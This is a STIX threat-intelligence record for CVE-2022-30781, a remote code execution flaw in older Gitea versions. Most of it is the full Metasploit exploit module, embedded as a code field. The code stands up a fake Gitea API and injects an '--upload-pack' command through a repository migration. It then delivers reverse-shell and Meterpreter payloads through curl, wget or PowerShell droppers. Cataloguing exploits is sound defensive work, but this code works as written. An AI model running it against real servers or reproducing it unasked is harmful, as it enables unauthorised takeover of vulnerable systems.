{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--539c6b2e-8879-4ef0-ba7f-b9d1d9fc7765",
    "created": "2024-08-14T17:09:51.745003Z",
    "modified": "2024-08-14T17:09:51.745008Z",
    "name": "Gitea Git Fetch Remote Code Execution",
    "description": " This module exploits Git fetch command in Gitea repository migration process that leads to a remote command execution on the system. This vulnerability affect Gitea before 1.16.7 version. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitea_git_fetch_rce.rb",
            "external_id": "gitea_git_fetch_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-30781"
        },
        {
            "source_name": "reference",
            "url": "https://tttang.com/archive/1607/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HTTP::Gitea\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gitea Git Fetch Remote Code Execution',\n        'Description' => %q{\n          This module exploits Git fetch command in Gitea repository migration\n          process that leads to a remote command execution on the system.\n          This vulnerability affect Gitea before 1.16.7 version.\n        },\n        'Author' => [\n          'wuhan005', # Original PoC\n          'li4n0', # Original PoC\n          'krastanoel' # MSF Module\n        ],\n        'References' => [\n          ['CVE', '2022-30781'],\n          ['URL', 'https://tttang.com/archive/1607/']\n        ],\n        'DisclosureDate' => '2022-05-16',\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix linux win],\n        'Arch' => ARCH_CMD,\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => %i[curl wget echo printf],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'CmdStagerFlavor' => [ 'psh_invokewebrequest' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n                'CMDSTAGER::URIPATH' => '/payloads'\n              }\n            }\n          ]\n        ],\n        'DefaultOptions' => { 'WfsDelay' => 30 },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(3000),\n      OptString.new('USERNAME', [true, 'Username to authenticate with']),\n      OptString.new('PASSWORD', [true, 'Password to use']),\n      OptString.new('URIPATH', [false, 'The URI to use for this exploit', '/']),\n    ])\n  end\n\n  def cleanup\n    super\n    return if @uid.nil? || @migrate_repo_created.nil?\n\n    [@repo_name, @migrate_repo_name].each do |name|\n      res = gitea_remove_repo(repo_path(name))\n      if res.nil? || res&.code == 200\n        vprint_warning(\"Unable to remove repository '#{name}'\")\n      elsif res&.code == 404\n        vprint_warning(\"Repository '#{name}' not found, possibly already deleted\")\n      else\n        vprint_status(\"Successfully cleanup repository '#{name}'\")\n      end\n    end\n  end\n\n  def check\n    return CheckCode::Safe('USERNAME can\\'t be blank') if datastore['username'].blank?\n\n    v = get_gitea_version\n    gitea_login(datastore['username'], datastore['password'])\n\n    if Rex::Version.new(v) <= Rex::Version.new('1.16.6')\n      return CheckCode::Appears(\"Version detected: #{v}\")\n    end\n\n    CheckCode::Safe(\"Version detected: #{v}\")\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::UnknownError => e\n    return CheckCode::Unknown(e.message)\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::VersionError => e\n    return CheckCode::Detected(e.message)\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError,\n         Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e\n    return CheckCode::Safe(e.message)\n  end\n\n  def primer\n    [\n      '/api/v1/version', '/api/v1/settings/api',\n      \"/api/v1/repos/#{@migrate_repo_path}\",\n      \"/api/v1/repos/#{@migrate_repo_path}/pulls\",\n      \"/api/v1/repos/#{@migrate_repo_path}/topics\"\n    ].each { |uri| hardcoded_uripath(uri) } # adding resources\n  end\n\n  def execute_command(cmd, _opts = {})\n    if target['Type'] == :win_dropper\n      # Git on Windows will pass the command to `sh.exe` and not `cmd`.\n      # This requires some adjustments:\n      # - Windows environment variables are mapped by `sh.exe`: `%VAR%` becomes `$VAR`\n      # - `cmd` uses `&` to join multiple commands, whereas `sh.exe` uses `&&`.\n      # - Backslashes need to be escaped with `sh.exe`\n      cmd = cmd.gsub(/%(\\w+)%/) { \"$#{::Regexp.last_match(1)}\" }.gsub(/&/) { '&&' }.gsub(/\\\\/) { '\\\\\\\\\\\\' }\n    end\n    vprint_status(\"Executing command: #{cmd}\")\n\n    @repo_name = rand_text_alphanumeric(6..15)\n    @migrate_repo_name = rand_text_alphanumeric(6..15)\n    @migrate_repo_path = repo_path(@migrate_repo_name)\n\n    vprint_status(\"Creating repository \\\"#{@repo_name}\\\"\")\n    @uid = gitea_create_repo(@repo_name)\n    vprint_good('Repository created')\n    vprint_status('Migrating repository')\n    clone_url = \"http://#{srvhost_addr}:#{srvport}/#{@migrate_repo_path}\"\n    auth_token = rand_text_alphanumeric(6..15)\n    @migrate_repo_created = gitea_migrate_repo(@migrate_repo_name, @uid, clone_url, auth_token)\n    @p = cmd\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::MigrationError,\n         Msf::Exploit::Remote::HTTP::Gitea::Error::RepositoryError,\n         Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  end\n\n  def exploit\n    unless datastore['AutoCheck']\n      fail_with(Failure::BadConfig, 'USERNAME can\\'t be blank') if datastore['username'].blank?\n      gitea_login(datastore['username'], datastore['password'])\n    end\n\n    start_service\n    primer\n\n    case target['Type']\n    when :unix_cmd, :win_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper, :win_dropper\n      datastore['CMDSTAGER::URIPATH'] = \"/#{rand_text_alphanumeric(6..15)}\"\n      execute_cmdstager(background: true, delay: 1)\n    end\n  rescue Timeout::Error => e\n    fail_with(Failure::TimeoutExpired, e.message)\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e\n    fail_with(Failure::NoAccess, e.message)\n  end\n\n  def repo_path(name)\n    \"#{datastore['username']}/#{name}\"\n  end\n\n  def on_request_uri(cli, req)\n    case req.uri\n    when '/api/v1/version'\n      send_response(cli, '{\"version\": \"1.16.6\"}')\n    when '/api/v1/settings/api'\n      data = {\n        max_response_items: 50, default_paging_num: 30,\n        default_git_trees_per_page: 1000, default_max_blob_size: 10485760\n      }\n      send_response(cli, data.to_json)\n    when \"/api/v1/repos/#{@migrate_repo_path}\"\n      data = {\n        clone_url: \"#{full_uri}#{datastore['username']}/#{@repo_name}\",\n        owner: { login: datastore['username'] }\n      }\n      send_response(cli, data.to_json)\n    when \"/api/v1/repos/#{@migrate_repo_path}/topics?limit=0&page=1\"\n      send_response(cli, '{\"topics\":[]}')\n    when \"/api/v1/repos/#{@migrate_repo_path}/pulls?limit=50&page=1&state=all\"\n      data = [\n        {\n          base: {\n            ref: 'master'\n          },\n          head: {\n            ref: \"--upload-pack=#{@p}\",\n            repo: {\n              clone_url: './',\n              owner: { login: 'master' }\n            }\n          },\n          updated_at: '2001-01-01T05:00:00+01:00',\n          user: {}\n        }\n      ]\n      send_response(cli, data.to_json)\n    when datastore['CMDSTAGER::URIPATH']\n      super\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-16",
    "x_mitre_platforms": [
        "win'"
    ]
}